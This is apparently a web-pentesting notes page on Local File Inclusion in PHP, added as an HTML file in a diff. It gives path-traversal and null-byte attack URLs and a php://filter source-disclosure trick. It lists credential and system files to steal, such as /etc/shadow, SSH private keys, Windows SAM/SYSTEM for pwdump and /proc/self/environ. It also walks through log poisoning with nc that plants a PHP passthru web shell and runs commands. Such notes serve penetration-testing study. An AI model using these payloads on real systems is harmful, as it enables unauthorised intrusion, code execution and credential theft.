@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="xapax">
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Local File Inclusion - Notes</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Local File Inclusion (LFI)", url: "#_top", children: [
+              {title: "How does it work?", url: "#how-does-it-work" },
+              {title: "Bypassing php-execution", url: "#bypassing-php-execution" },
+              {title: "Linux", url: "#linux" },
+              {title: "Bruteforcing SSH known_hosts", url: "#bruteforcing-ssh-known95hosts" },
+              {title: "LFI to shell", url: "#lfi-to-shell" },
+              {title: "Windows", url: "#windows" },
+              {title: "References:", url: "#references" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../static_analysis_of_javascript/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../static_analysis_of_javascript/" class="btn btn-xs btn-link">
+        Static Analysis of JavaScript
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../dom_based_xss/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../dom_based_xss/" class="btn btn-xs btn-link">
+        DOM XSS
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="local-file-inclusion-lfi">Local File Inclusion (LFI)<a class="headerlink" href="#local-file-inclusion-lfi" title="Permanent link">#</a></h1>
+<p>Local file inclusion means unauthorized access to files on the system. This vulnerability lets the attacker gain access to sensitive files on the server, and it might also lead to gaining a shell.</p>
+<h2 id="how-does-it-work">How does it work?<a class="headerlink" href="#how-does-it-work" title="Permanent link">#</a></h2>
+<p>The vulnerability stems from unsanitized user-input. LFI is particularly common in php-sites. </p>
+<p>Here is an example of php-code vulnerable to LFI. As you can see we just pass in the url-parameter into the require-function without any sanitization. So the user can just add the path to any file.</p>
+<pre><code class="php">$file = $_GET['page'];
+require($file);
+</code></pre>
+
+<p>In this example the user could just enter this string and retrieve the <code>/etc/passwd</code> file.</p>
+<pre><code>http://example.com/page=../../../../../../etc/passwd
+</code></pre>
+
+<h3 id="bypassing-the-added-php-and-other-extra-file-endings">Bypassing the added .php and other extra file-endings<a class="headerlink" href="#bypassing-the-added-php-and-other-extra-file-endings" title="Permanent link">#</a></h3>
+<p>It is common to add the file-extension through the php-code. Here is how this would look like:</p>
+<pre><code class="php">$file = $_GET['page'];
+require($file . &quot;.php&quot;);
+</code></pre>
+
+<p>The php is added to the filename, this will mean that we will not be able to find the files we are looking for. Since the file <code>/etc/passwd.php</code> does not exist. However, if we add the nullbyte to the end of our attack-string the <code>.php</code> will not be taken into account. So we add <code>%00</code> to the end of our attack-string.</p>
+<pre><code>http://example.com/page=../../../../../../etc/passwd%00
+</code></pre>
+
+<p>This technique is usually called the nullbyte technique since <code>%00</code> is the nullbyte. The technique only works in versions below php 5.3. So look out for that.</p>
+<p>Another way to deal with this problem is just to add a question mark to your attack-string. This way the stuff after gets interpreted as a parameter and therefore excluded. Here is an example:</p>
+<pre><code>http://example.com/page=../../../../../../etc/passwd?
+</code></pre>
+
+<h2 id="bypassing-php-execution">Bypassing php-execution<a class="headerlink" href="#bypassing-php-execution" title="Permanent link">#</a></h2>
+<p>So if you have an LFI you can easily read <code>.txt</code>-files but not <code>.php</code> files. That is because they get executed by the webserver, since their file-ending says that it contains code. This can be bypassed by using a build-in php-filter.</p>
+<pre><code>http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index
+</code></pre>
+
+<p>Here you use a php-filter to convert it all into base64. So in return you get the whole page base64 encoded. Now you only need to decode it. Save the base64-text into a file and then run:</p>
+<pre><code>base64 -d savefile.php
+</code></pre>
+
+<h2 id="linux">Linux<a class="headerlink" href="#linux" title="Permanent link">#</a></h2>
+<h3 id="tricks">Tricks<a class="headerlink" href="#tricks" title="Permanent link">#</a></h3>
+<p><strong>Download config-files in a nice style-format</strong>  </p>
+<p>If you read files straight in the browser the styling can becomes unbearable. Really difficult to read. A way around it is to download the files from the terminal. But that won't work if there is a login that is blocking it. So this is a great workaround:</p>
+<pre><code># First we save the cookie
+curl -s http://example.com/login.php -c cookiefile -d &quot;user=admin&amp;pass=admin&quot;
+curl -s http://example.com/gallery.php?page=/etc/passwd -b cookiefile
+</code></pre>
+
+<h3 id="sensitive-file">Sensitive file<a class="headerlink" href="#sensitive-file" title="Permanent link">#</a></h3>
+<p>This is the default layout of important apache files.<br />
+<a href="https://wiki.apache.org/httpd/DistrosDefaultLayout">https://wiki.apache.org/httpd/DistrosDefaultLayout</a></p>
+<pre><code>/etc/issue (A message or system identification to be printed before the login prompt.)
+/etc/motd (Message of the day banner content. Can contain information about the system owners or use of the system.)
+/etc/passwd 
+/etc/group 
+/etc/resolv.conf (might be better than /etc/passwd for triggering IDS sigs)
+/etc/shadow
+/home/[USERNAME]/.bash_history or .profile
+~/.bash_history or .profile
+$USER/.bash_history or .profile
+/root/.bash_history or .profile
+</code></pre>
+
+<p>Comes from here: <a href="https://gist.github.com/sckalath/a8fd4e754a72015aa0b8">https://gist.github.com/sckalath/a8fd4e754a72015aa0b8</a></p>
+<pre><code>/etc/mtab  
+/etc/inetd.conf  
+/var/log/dmessage
+</code></pre>
+
+<p><strong>Web server files</strong></p>
+<pre><code># Usually found in the root of the website
+.htaccess
+config.php
+</code></pre>
+
+<p><strong>SSH</strong></p>
+<pre><code>authorized_keys
+id_rsa
+id_rsa.keystore
+id_rsa.pub
+known_hosts
+</code></pre>
+
+<p><strong>Logs</strong></p>
+<pre><code>/etc/httpd/logs/acces_log 
+/etc/httpd/logs/error_log 
+/var/www/logs/access_log 
+/var/www/logs/access.log 
+/usr/local/apache/logs/access_ log 
+/usr/local/apache/logs/access. log 
+/var/log/apache/access_log 
+/var/log/apache2/access_log 
+/var/log/apache/access.log 
+/var/log/apache2/access.log
+/var/log/access_log
+</code></pre>
+
+<p><strong>User specific files</strong></p>
+<p>Found in the home-directory</p>
+<pre><code>.bash_history
+.mysql_history
+.my.cnf
+</code></pre>
+
+<p><strong>Proc files</strong></p>
+<p>"Under Linux, /proc includes a directory for each running process, including kernel processes, in directories named /proc/PID, where PID is the process number. Each directory contains information about one process, including: /proc/PID/cmdline, the command that originally started the process."</p>
+<p><a href="https://en.wikipedia.org/wiki/Procfs">https://en.wikipedia.org/wiki/Procfs</a></p>
+<p><a href="https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/">https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/</a></p>
+<pre><code>/proc/sched_debug # Can be used to see what processes the machine is running
+/proc/mounts
+/proc/net/arp
+/proc/net/route
+/proc/net/tcp
+/proc/net/udp
+/proc/net/fib_trie
+/proc/version
+/proc/self/environ
+</code></pre>
+
+<h2 id="bruteforcing-ssh-known95hosts">Bruteforcing SSH known_hosts<a class="headerlink" href="#bruteforcing-ssh-known95hosts" title="Permanent link">#</a></h2>
+<p><a href="https://blog.rootshell.be/2010/11/03/bruteforcing-ssh-known_hosts-files/">https://blog.rootshell.be/2010/11/03/bruteforcing-ssh-known_hosts-files/</a></p>
+<h2 id="lfi-to-shell">LFI to shell<a class="headerlink" href="#lfi-to-shell" title="Permanent link">#</a></h2>
+<p>Under the right circumstances you might be able to get a shell from a LFI</p>
+<h3 id="log-poisoning">Log poisoning<a class="headerlink" href="#log-poisoning" title="Permanent link">#</a></h3>
+<p>There are some requirements. We need to be able to read log files. In this example we are going to poison the apache log file. You can use either the success.log or the error.log</p>
+<p>So once you have found a LFI vuln you have to inject php-code into the log file and then execute it.</p>
+<p><strong>Insert php-code into the log file</strong></p>
+<p>This can be done with nc or telnet.</p>
+<pre><code>nc 192.168.1.102 80
+GET /&lt;?php passthru($_GET['cmd']); ?&gt; HTTP/1.1
+Host: 192.168.1.102
+Connection: close
+</code></pre>
+
+<p>You can also add it to the error-log by making a request to a page that doesn't exists</p>
+<pre><code>nc 192.168.1.102 80
+GET /AAAAAA&lt;?php passthru($_GET['cmd']); ?&gt; HTTP/1.1
+Host: 192.168.1.102
+Connection: close
+</code></pre>
+
+<p>Or in the referer parameter.</p>
+<pre><code>GET / HTTP/1.1
+Referer: &lt;? passthru($_GET[cmd]) ?&gt;
+Host: 192.168.1.159
+Connection: close
+</code></pre>
+
+<p><strong>Execute it in the browser</strong></p>
+<p>Now you can request the log-file through the LFI and see the php-code get executed. </p>
+<pre><code>http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&amp;cmd=id
+</code></pre>
+
+<h3 id="proc-files">Proc files<a class="headerlink" href="#proc-files" title="Permanent link">#</a></h3>
+<p>If you can read the proc-files on the system you might be able to poison them through the user-agent.</p>
+<p>We can also inject code into /proc/self/environ through the user-agent</p>
+<p><a href="https://www.exploit-db.com/papers/12992/">https://www.exploit-db.com/papers/12992/</a></p>
+<p><a href="https://www.youtube.com/watch?v=ttTVNcPnsJY">https://www.youtube.com/watch?v=ttTVNcPnsJY</a></p>
+<h2 id="windows">Windows<a class="headerlink" href="#windows" title="Permanent link">#</a></h2>
+<p><strong>Fingerprinting</strong></p>
+<pre><code>c:\WINDOWS\system32\eula.txt
+c:\boot.ini  
+c:\WINDOWS\win.ini  
+c:\WINNT\win.ini  
+c:\WINDOWS\Repair\SAM  
+c:\WINDOWS\php.ini  
+c:\WINNT\php.ini  
+c:\Program Files\Apache Group\Apache\conf\httpd.conf  
+c:\Program Files\Apache Group\Apache2\conf\httpd.conf  
+c:\Program Files\xampp\apache\conf\httpd.conf  
+c:\php\php.ini  
+c:\php5\php.ini  
+c:\php4\php.ini  
+c:\apache\php\php.ini  
+c:\xampp\apache\bin\php.ini  
+c:\home2\bin\stable\apache\php.ini  
+c:\home\bin\stable\apache\php.ini
+</code></pre>
+
+<p><strong>Logs</strong></p>
+<p>Common path for apache log files on windows:</p>
+<pre><code>c:\Program Files\Apache Group\Apache\logs\access.log  
+c:\Program Files\Apache Group\Apache\logs\error.log
+</code></pre>
+
+<p><strong>PHP Session Locations</strong></p>
+<pre><code>c:\WINDOWS\TEMP\  
+c:\php\sessions\  
+c:\php5\sessions\  
+c:\php4\sessions\
+</code></pre>
+
+<p><strong>Retrieving password hashes</strong></p>
+<p>In order to retrieve the systems password hashed we need two files: <strong>system</strong> and <strong>SAM</strong>. Once you have those two files you can extract the hased using the kali tool pwdump, like this:</p>
+<pre><code>pwdump systemfile samfile
+</code></pre>
+
+<p>The system and SAM files can be found in different locations, so try them all. From a webserver the path might be case-sensitive, even though it is windows. So consider that!</p>
+<pre><code>Systemroot is usually windows
+windows\repair\SAM
+%SYSTEMROOT%\repair\SAM
+%SYSTEMROOT%\System32\config\RegBack\SAM
+%SYSTEMROOT%\System32\config\SAM
+
+
+%SYSTEMROOT%\repair\system
+%SYSTEMROOT%\System32\config\SYSTEM
+%SYSTEMROOT%\System32\config\RegBack\system
+</code></pre>
+
+<h2 id="references">References:<a class="headerlink" href="#references" title="Permanent link">#</a></h2>
+<p>This is the definitive guide to Local File inclusion<br />
+<a href="https://highon.coffee/blog/lfi-cheat-sheet/">https://highon.coffee/blog/lfi-cheat-sheet/</a></p>
+<p>And this<br />
+<a href="http://securityidiots.com/Web-Pentest/LFI">http://securityidiots.com/Web-Pentest/LFI</a></p>
+<p>And this:</p>
+<p><a href="https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/">https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/</a></p>
+<p><a href="https://nets.ec/File_Inclusion">https://nets.ec/File_Inclusion</a>  </p>
+<p><a href="https://gist.github.com/sckalath/da1a232f362a700ab459">https://gist.github.com/sckalath/da1a232f362a700ab459</a></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../static_analysis_of_javascript/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../static_analysis_of_javascript/" class="btn btn-xs btn-link">
+        Static Analysis of JavaScript
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../dom_based_xss/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../dom_based_xss/" class="btn btn-xs btn-link">
+        DOM XSS
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+      <p>
+        <a href="https://github.com/xapax/edit/master/docs/attacking_web_applications/local_file_inclusion.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
